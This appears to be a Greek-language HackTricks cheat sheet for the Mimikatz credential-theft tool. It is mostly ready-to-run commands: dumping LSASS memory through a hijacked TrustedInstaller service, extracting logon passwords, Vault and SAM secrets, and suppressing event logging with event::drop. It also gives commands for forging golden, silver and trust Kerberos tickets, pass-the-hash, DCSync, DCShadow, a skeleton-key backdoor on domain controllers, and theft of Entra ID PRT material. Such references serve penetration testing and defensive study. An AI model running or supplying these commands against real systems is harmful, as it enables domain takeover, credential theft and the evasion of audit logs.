# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Αυτή η σελίδα βασίζεται σε μία από το [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Ελέγξτε το πρωτότυπο για περισσότερες πληροφορίες!<sup>[[3]](#references)</sup>

## LM και Clear-Text στη μνήμη

Από τα Windows 8.1 και τα Windows Server 2012 R2 και έπειτα, έχουν εφαρμοστεί σημαντικά μέτρα για την προστασία από την κλοπή διαπιστευτηρίων:

- **Τα LM hashes και οι plain-text κωδικοί πρόσβασης** δεν αποθηκεύονται πλέον στη μνήμη για ενισχυμένη ασφάλεια. Μια συγκεκριμένη ρύθμιση registry, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ πρέπει να ρυθμιστεί με τιμή DWORD `0` για την απενεργοποίηση του Digest Authentication, διασφαλίζοντας ότι οι "clear-text" κωδικοί πρόσβασης δεν αποθηκεύονται προσωρινά στο LSASS.

- Το **LSA Protection** εισάγεται για την προστασία της διεργασίας Local Security Authority (LSA) από μη εξουσιοδοτημένη ανάγνωση μνήμης και code injection. Αυτό επιτυγχάνεται με τη σήμανση του LSASS ως protected process. Η ενεργοποίηση του LSA Protection περιλαμβάνει:
1. Τροποποίηση του registry στη θέση _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ με ρύθμιση του `RunAsPPL` σε `dword:00000001`.
2. Εφαρμογή ενός Group Policy Object (GPO) που επιβάλλει αυτή την αλλαγή registry σε όλες τις managed συσκευές.

Παρά αυτές τις προστασίες, εργαλεία όπως το Mimikatz μπορούν να παρακάμψουν το LSA Protection χρησιμοποιώντας συγκεκριμένους drivers, αν και τέτοιες ενέργειες πιθανότατα θα καταγραφούν στα event logs.

Στα σύγχρονα workstations αυτό έχει ακόμη μεγαλύτερη σημασία, επειδή το **Credential Guard είναι ενεργοποιημένο από προεπιλογή σε πολλά domain-joined, non-DC συστήματα με Windows 11 22H2+ και Windows Server 2025**, ενώ το **LSASS-as-PPL είναι ενεργοποιημένο από προεπιλογή σε νέες εγκαταστάσεις Windows 11 22H2+**. Στην πράξη, αυτό σημαίνει ότι το `sekurlsa::logonpasswords` συχνά επιστρέφει λιγότερα δεδομένα από όσα αναμενόταν με παλαιότερο tradecraft και οι operators στρέφονται όλο και περισσότερο σε **offline minidumps**, **εξαγωγή κλειδιών Kerberos (`sekurlsa::ekeys`)** ή modules που σχετίζονται με **CloudAP/PRT**. Για την πλευρά της προστασίας, δείτε το [Windows credentials protections](credentials-protections.md).

### Αντιμετώπιση της αφαίρεσης του SeDebugPrivilege

Οι administrators έχουν συνήθως SeDebugPrivilege, το οποίο τους επιτρέπει να κάνουν debug σε προγράμματα. Αυτό το privilege μπορεί να περιοριστεί για την αποτροπή μη εξουσιοδοτημένων memory dumps, μιας συνηθισμένης τεχνικής που χρησιμοποιείται από attackers για την εξαγωγή διαπιστευτηρίων από τη μνήμη. Ωστόσο, ακόμη και αν αυτό το privilege έχει αφαιρεθεί, ο λογαριασμός TrustedInstaller μπορεί να εκτελεί memory dumps χρησιμοποιώντας μια προσαρμοσμένη ρύθμιση service:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Αυτό επιτρέπει το dumping της μνήμης του `lsass.exe` σε ένα αρχείο, το οποίο μπορεί στη συνέχεια να αναλυθεί σε ένα άλλο σύστημα για την εξαγωγή credentials:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Η παραποίηση των event logs στο Mimikatz περιλαμβάνει δύο βασικές ενέργειες: την εκκαθάριση των event logs και την εφαρμογή patch στην υπηρεσία Event, ώστε να αποτρέπεται η καταγραφή νέων events. Παρακάτω είναι οι εντολές για την εκτέλεση αυτών των ενεργειών:

#### Εκκαθάριση Event Logs

- **Command**: Η ενέργεια αυτή αποσκοπεί στη διαγραφή των event logs, καθιστώντας δυσκολότερη την παρακολούθηση κακόβουλων ενεργειών.
- Το Mimikatz δεν παρέχει άμεση εντολή στην τυπική τεκμηρίωσή του για την απευθείας εκκαθάριση των event logs μέσω της γραμμής εντολών. Ωστόσο, η διαχείριση των event logs συνήθως περιλαμβάνει τη χρήση system tools ή scripts εκτός του Mimikatz για την εκκαθάριση συγκεκριμένων logs (π.χ. μέσω PowerShell ή του Windows Event Viewer).

#### Experimental Feature: Εφαρμογή Patch στην Event Service

- **Command**: `event::drop`
- Αυτή η experimental εντολή έχει σχεδιαστεί για να τροποποιεί τη συμπεριφορά του Event Logging Service, αποτρέποντάς το ουσιαστικά από την καταγραφή νέων events.
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- Η εντολή `privilege::debug` διασφαλίζει ότι το Mimikatz εκτελείται με τα απαραίτητα δικαιώματα για την τροποποίηση system services.
- Στη συνέχεια, η εντολή `event::drop` εφαρμόζει patch στο Event Logging service.

### Kerberos Ticket Attacks

Χρησιμοποιήστε τις παρακάτω εντολές ως γρήγορες υπενθυμίσεις σύνταξης. Οι dedicated σελίδες για [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) και [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) περιέχουν τις πιο ενημερωμένες λεπτομέρειες σχετικά με AES/PAC/opsec.

### Golden Ticket Creation

Ένα Golden Ticket επιτρέπει impersonation με πρόσβαση σε ολόκληρο το domain. Βασική εντολή και παράμετροι:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: Το όνομα του domain.
- `/sid`: Το Security Identifier (SID) του domain.
- `/user`: Το username που θα γίνει impersonate.
- `/krbtgt`: Το NTLM hash του service account KDC του domain.
- `/ptt`: Κάνει απευθείας inject το ticket στη μνήμη.
- `/ticket`: Αποθηκεύει το ticket για μεταγενέστερη χρήση.

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Τα Silver Tickets παρέχουν πρόσβαση σε συγκεκριμένες services. Βασικές εντολές και παράμετροι:

- Command: Παρόμοιο με το Golden Ticket, αλλά στοχεύει συγκεκριμένες services.
- Parameters:
- `/service`: Η service που θα στοχευτεί (π.χ. cifs, http).
- Άλλες παράμετροι παρόμοιες με το Golden Ticket.

Example:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Δημιουργία Trust Ticket

Τα Trust Tickets χρησιμοποιούνται για την πρόσβαση σε resources μεταξύ domains, αξιοποιώντας trust relationships. Βασική εντολή και parameters:

- Command: Παρόμοια με το Golden Ticket, αλλά για trust relationships.
- Parameters:
- `/target`: Το FQDN του target domain.
- `/rc4`: Το NTLM hash για το trust account.

Παράδειγμα:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Πρόσθετες εντολές Kerberos

- **Listing Tickets**:

- Command: `kerberos::list`
- Εμφανίζει όλα τα Kerberos tickets για την τρέχουσα user session.

- **Pass the Cache**:

- Command: `kerberos::ptc`
- Κάνει inject Kerberos tickets από cache files.
- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Command: `kerberos::ptt`
- Επιτρέπει τη χρήση ενός Kerberos ticket σε άλλη session.
- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
- Command: `kerberos::purge`
- Διαγράφει όλα τα Kerberos tickets από τη session.
- Είναι χρήσιμο πριν από τη χρήση εντολών ticket manipulation, ώστε να αποφεύγονται conflicts.

### Over-Pass-the-Hash / Pass-the-Key

Αν το `RC4` είναι απενεργοποιημένο ή unreliable, το Mimikatz μπορεί να κάνει patch τα **AES128/AES256 Kerberos keys** στην τρέχουσα logon session, αντί να χρησιμοποιεί μόνο ένα NT hash. Αυτό είναι συνήθως καταλληλότερο για σύγχρονα domains από την αντιμετώπιση του `sekurlsa::pth` ως NTLM-only.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` επαναχρησιμοποιεί την τρέχουσα διεργασία αντί να δημιουργεί νέα κονσόλα, κάτι που είναι χρήσιμο όταν θέλετε να εκτελέσετε άμεσα εντολές όπως `lsadump::dcsync` στο ίδιο context.

### Παραποίηση Active Directory

- **DCShadow**: Κάνει προσωρινά ένα μηχάνημα να λειτουργεί ως DC για τον χειρισμό αντικειμένων του AD. Δείτε [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Μιμείται ένα DC για να ζητήσει δεδομένα κωδικών πρόσβασης. Δείτε [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Πρόσβαση σε διαπιστευτήρια

- **LSADUMP::LSA**: Εξάγει διαπιστευτήρια από το LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Μιμείται ένα DC χρησιμοποιώντας τα δεδομένα κωδικού πρόσβασης ενός λογαριασμού υπολογιστή.

- _Δεν παρέχεται συγκεκριμένη εντολή για το NetSync στο αρχικό context._

- **LSADUMP::SAM**: Αποκτά πρόσβαση στην τοπική βάση δεδομένων SAM.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Αποκρυπτογραφεί secrets που είναι αποθηκευμένα στο registry.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Ορίζει νέο NTLM hash για έναν χρήστη.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Ανακτά πληροφορίες authentication των trust relationships.
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

Σε hosts με **Entra ID** ή **hybrid-joined**, το `sekurlsa::cloudap` μπορεί να αποκαλύψει cached υλικό **Primary Refresh Token (PRT)** από το LSASS. Αν το συσχετισμένο Proof-of-Possession key προστατεύεται από software, το `dpapi::cloudapkd` μπορεί να παράγει το clear/derived key material που απαιτείται για επόμενα workflows **Pass-the-PRT**.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
Αυτό γίνεται πολύ πιο δύσκολο όταν το κλειδί υποστηρίζεται από TPM, αλλά αξίζει να το ελέγξετε σε hybrid endpoints, επειδή τα cached δεδομένα του CloudAP μπορεί να είναι πιο ενδιαφέροντα από την κλασική έξοδο του `wdigest`.<sup>[[2]](#references)</sup> Για την cloud-side abuse chain, δείτε το [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Διάφορα

- **MISC::Skeleton**: Εγχύστε ένα backdoor στο LSASS σε έναν DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Escalation προνομίων

- **PRIVILEGE::Backup**: Αποκτήστε δικαιώματα backup.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Αποκτήστε debug privileges.
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Εμφανίστε τα credentials των συνδεδεμένων χρηστών.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Εξαγάγετε Kerberos tickets από τη μνήμη.
- `mimikatz "sekurlsa::tickets /export" exit`

### Χειρισμός SID και Token

- **SID::add/modify**: Αλλάξτε το SID και το SIDHistory.

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _Δεν υπάρχει συγκεκριμένη εντολή για modify στο αρχικό context._

- **TOKEN::Elevate**: Κάντε impersonate tokens.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Επιτρέψτε πολλαπλές RDP sessions.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Εμφανίστε τις TS/RDP sessions.
- _Δεν παρέχεται συγκεκριμένη εντολή για το TS::Sessions στο αρχικό context._

### Vault

- Εξαγάγετε passwords από το Windows Vault.
- `mimikatz "vault::cred /patch" exit`


## References

- [1] [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Mimikatz command reference](https://adsecurity.org/?page_id=1821)

{{#include ../../banners/hacktricks-training.md}}
